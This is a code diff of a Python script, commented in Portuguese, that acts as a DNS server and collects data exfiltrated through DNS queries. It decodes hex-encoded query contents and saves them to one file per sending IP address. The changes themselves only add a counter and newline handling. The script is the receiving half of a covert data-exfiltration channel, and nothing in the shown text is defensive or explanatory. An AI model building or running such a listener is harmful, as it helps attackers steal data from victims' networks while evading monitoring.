@@ -18,9 +18,12 @@ _COR = {
         'green':'\033[32m',
         'yellow':'\033[33m'
     }
+_CONT = 0
 ###############################################################
 # Classes e Funções
 ###############################################################
+def Enter_txt(data):
+    return
 def treatments(data):
     replacements = {
         '´a': 'á',
@@ -81,7 +84,9 @@ def menu(addr=None, data=None):
 ''')
 
 
+
 def start_dns_server():
+    global _CONT
     # Cria um socket para ouvir requisições DNS
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(_DNS_ADDR)
@@ -91,6 +96,7 @@ def start_dns_server():
     while True:
         try:
             data, addr = sock.recvfrom(512)
+            _CONT += 1
 
             # Formando o path para cada cliente
             path = str(addr[0]) + '.txt'
@@ -103,7 +109,11 @@ def start_dns_server():
             # Decodifica os dados do domínio
             data = ''.join([chr(int(data[i:i+2], 16)) for i in range(0, len(data), 2)])
             #print(f"Dados exfiltrados: {str(data)}")
-            data = treatments(data)
+            if _CONT == 2:
+                data = treatments(data) + '\n'
+                _CONT = 0
+            else:
+                data = treatments(data)
             menu(addr, data)
             write_on_file(path, data)            
             
